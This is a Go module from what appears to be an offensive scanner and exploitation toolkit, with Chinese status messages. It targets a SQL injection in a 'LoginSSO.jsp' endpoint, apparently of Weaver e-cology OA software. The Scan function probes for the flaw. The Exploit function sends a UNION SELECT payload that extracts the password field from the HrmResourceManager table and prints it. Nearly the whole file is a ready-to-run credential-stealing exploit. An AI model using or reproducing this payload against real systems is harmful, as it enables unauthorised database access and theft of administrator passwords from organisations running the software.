package vulners

import (
	"fmt"
	"github.com/fatih/color"
	"regexp"
	"strings"
)

type Wc04 struct {
}

func (s *Wc04) Scan(targetUrl string) {
	vulnerable, err := Wc04scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc04] 存在LoginSSO SQL注入")
	} else {
		color.White("[Wc04] 不存在LoginSSO SQL注入")
	}
}

func (*Wc04) Exploit(targetUrl string) {
	runResult, err := Wc04runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc04scancore(targetUrl string) (bool, error) {
	url := "/upgrade/detail.jsp/login/LoginSSO.jsp?id="
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "pre") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc04runcore(targetUrl string) (string, error) {
	url := "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	fmt.Printf("此漏洞利用若检测成功利用若无结果,多试两次。\n")
	r, err := regexp.Compile("<code>([\\s\\S]*?)</code>")
	if err != nil {
		return "", nil
	}
	result := strings.Replace(r.FindString(resContent), "<code>", "", -1)
	result = strings.Replace(result, "</code>", "", -1)
	if strings.Contains(resContent, "pre") {
		return "存在LoginSSO SQL注入\n" + "password:" + result, nil
	} else {
		return "", nil
	}
}
